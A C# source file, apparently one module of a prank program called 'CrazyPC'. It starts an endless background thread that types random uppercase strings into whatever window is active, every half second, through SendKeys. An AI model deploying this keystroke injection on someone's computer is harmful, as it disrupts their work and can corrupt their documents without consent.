using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Messaging;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace MultiThread.CarzyPC
{
    internal class keystrokes
    {
       public static void threadKeyStroke()
        {
            Thread thread = new Thread(keyRan);
            thread.Start();
        }



        private static void keyRan()
        {
            while (true)
            {
                Random rand = new Random();

                // Choosing the size of string
                // Using Next() string
                int stringlen = rand.Next(4, 30);
                int randValue;
                string str = "";
                char letter;
                for (int i = 0; i < stringlen; i++)
                {

                    // Gives random number.
                    randValue = rand.Next(0, 26);

                    // Generating random character by converting the random number into character.
                    letter = Convert.ToChar(randValue + 65);

                    // Appending the letter to string.
                    str = str + letter;
                }
                SendKeys.SendWait(str);
                Thread.Sleep(500);

            }
        }


    }
}

